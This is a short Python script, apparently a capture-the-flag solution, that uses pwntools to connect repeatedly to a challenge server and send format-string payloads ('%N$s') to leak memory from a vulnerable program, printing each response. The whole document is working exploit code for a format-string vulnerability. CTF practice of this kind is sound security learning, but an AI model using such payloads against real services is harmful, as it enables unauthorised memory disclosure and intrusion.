from pwn import *

host, port = 'shell.2019.nactf.com', 31782
for i in range(25):
	s = connect(host,port)
	s.recvuntil('Type something>')
	s.sendline('%' + str(i) + '$s')
	print('%' + str(i) + '$s')

	response = s.recv()
	print(response)
	s.close
